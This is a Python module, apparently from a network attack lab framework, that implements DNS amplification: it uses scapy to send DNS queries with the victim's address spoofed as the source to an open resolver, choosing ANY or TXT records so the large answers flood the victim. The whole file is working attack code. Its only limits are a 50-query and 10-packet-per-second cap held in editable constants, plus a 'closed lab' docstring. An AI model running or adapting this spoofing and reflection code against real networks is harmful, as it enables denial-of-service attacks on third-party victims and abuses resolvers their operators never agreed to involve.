"""DNS amplification (reflection) for a closed lab.

Queries are sent to a resolver with the victim's address as the source, so the
large answer is reflected to the victim. Count and rate are hard-capped in code.
"""

from __future__ import annotations

import random
from typing import Any

from scapy.all import DNS, DNSQR, IP, UDP, conf, send  # type: ignore

from netlab.base import BaseModule, ModuleParam

MAX_QUERIES = 50
MAX_PPS = 10


class DnsAmplification(BaseModule):
    name = "dns_amp"
    description = "Spoof DNS queries so the resolver answers the victim (hard-capped)"
    category = "l3_l4"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(
                name="victim",
                type="ip",
                label="Victim (spoofed source)",
                required=True,
                description="Who receives the reflected answers",
            ),
            ModuleParam(
                name="resolver",
                type="ip",
                label="DNS resolver",
                required=True,
                description="Open resolver inside the lab",
            ),
            ModuleParam(
                name="query_name",
                type="str",
                label="Query name",
                required=False,
                default="example.com",
            ),
            ModuleParam(
                name="qtype",
                type="str",
                label="Query type",
                required=False,
                default="ANY",
                description="ANY or TXT — larger answers amplify more",
            ),
            ModuleParam(
                name="interface",
                type="interface",
                label="Interface",
                required=False,
                default=None,
            ),
            ModuleParam(
                name="count",
                type="int",
                label="Queries",
                required=False,
                default=10,
                description=f"Hard cap {MAX_QUERIES}",
            ),
            ModuleParam(
                name="rate_limit_pps",
                type="int",
                label="Rate limit (pps)",
                required=False,
                default=5,
                description=f"Hard cap {MAX_PPS}",
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        victim = params["victim"]
        resolver = params["resolver"]
        qname = str(params.get("query_name") or "example.com")
        qtype = str(params.get("qtype") or "ANY").upper()
        iface = params.get("interface") or None
        count = min(int(params.get("count", 10)), MAX_QUERIES)
        rate_limiter.set_rate(min(rate_limiter.pps or MAX_PPS, MAX_PPS))
        if iface:
            conf.iface = iface
        conf.verb = 0

        print(
            f"[dns_amp] {count} queries {qname}/{qtype} via {resolver}, "
            f"source spoofed as {victim} (cap {MAX_QUERIES} queries / {MAX_PPS} pps)"
        )
        for i in range(count):
            if self.should_stop():
                print("[dns_amp] Stopped")
                break
            rate_limiter.wait()
            pkt = (
                IP(src=victim, dst=resolver)
                / UDP(sport=random.randint(1024, 65535), dport=53)
                / DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype))
            )
            send(pkt, verbose=0)
            logger.add_packets(1, len(bytes(pkt)))
        print("[dns_amp] Done")
        print("  Answers, if the resolver responds, are delivered to the victim.")
